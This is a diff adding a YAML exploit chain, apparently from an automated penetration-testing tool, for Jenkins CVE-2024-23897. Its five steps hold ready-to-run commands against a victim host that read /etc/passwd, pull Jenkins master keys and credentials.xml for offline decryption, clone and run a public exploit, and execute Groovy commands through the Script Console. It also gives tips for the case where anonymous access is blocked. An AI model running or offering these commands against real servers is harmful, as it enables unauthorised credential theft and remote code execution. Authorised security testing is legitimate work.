@@ -1,0 +1,69 @@
+chain_id: jenkins_cli_cve_2024_23897
+title: "Jenkins — CVE-2024-23897 CLI arbitrary file read → RCE"
+severity: CRITICAL
+tags: [jenkins, web, cve-2024-23897, cli, file-read, args4j, rce]
+
+trigger:
+  any_of:
+    - { kind: "CVE-2024-23897" }
+    - { banner_pattern: "(?i)jenkins" }
+    - { product_pattern: "(?i)jenkins" }
+    - { path_pattern: "(?i)/jnlpJars/jenkins-cli\\.jar" }
+
+description: |
+  Jenkins ≤ 2.441 LTS / 2.426.2 expand `@<file>` in CLI args via the
+  args4j parser before authentication is checked. Result: arbitrary
+  file read as the Jenkins user. With a readable `secrets/` directory
+  you decrypt creds, or with a usable `Resource Root URL` and
+  `cancelQuietDown` you escalate to RCE. CISA-tagged, mass-scanned.
+
+steps:
+  - id: 1
+    title: "Pull the matching CLI jar from the target itself"
+    command: |
+      curl -sk "http://$VICTIMA:8080/jnlpJars/jenkins-cli.jar" -o /tmp/jenkins-cli.jar
+      java -jar /tmp/jenkins-cli.jar -s "http://$VICTIMA:8080/" who-am-i 2>&1 | head -3
+
+  - id: 2
+    title: "Read /etc/passwd via the @-expansion"
+    command: |
+      java -jar /tmp/jenkins-cli.jar -s "http://$VICTIMA:8080/" \
+        connect-node "@/etc/passwd"
+
+  - id: 3
+    title: "Read Jenkins secrets to decrypt stored creds"
+    command: |
+      java -jar /tmp/jenkins-cli.jar -s "http://$VICTIMA:8080/" \
+        connect-node "@/var/jenkins_home/secrets/master.key"
+      java -jar /tmp/jenkins-cli.jar -s "http://$VICTIMA:8080/" \
+        connect-node "@/var/jenkins_home/secrets/hudson.util.Secret"
+      java -jar /tmp/jenkins-cli.jar -s "http://$VICTIMA:8080/" \
+        connect-node "@/var/jenkins_home/credentials.xml"
+      # Decrypt offline:
+      git clone https://github.com/jenkinsci-cert/jenkins-decrypt /tmp/jdec
+      python3 /tmp/jdec/jenkins-decrypt.py master.key hudson.util.Secret credentials.xml
+
+  - id: 4
+    title: "Public PoC + RCE via Resource Root URL"
+    command: |
+      git clone https://github.com/h4x0r-dz/CVE-2024-23897 /tmp/cve23897
+      python3 /tmp/cve23897/exploit.py -u http://$VICTIMA:8080 -f /etc/passwd
+
+  - id: 5
+    title: "If `Overall/Read` is anonymous and you got a session cookie"
+    command: |
+      # Drop into Script Console for direct Groovy RCE:
+      curl -sk -b 'JSESSIONID=...' "http://$VICTIMA:8080/script" \
+        --data-urlencode "script=println 'id'.execute().text" \
+        --data 'Submit=Run'
+
+common_errors:
+  - error: "anonymous CLI returns 'no permission'"
+    solution: |
+      Anonymous Read disabled. The bug still works with any low-priv
+      auth — even an Overall/Read-only token gives the file read.
+      Try `who-am-i` first to map your permission level.
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2024-23897
+  - https://www.jenkins.io/security/advisory/2024-01-24/
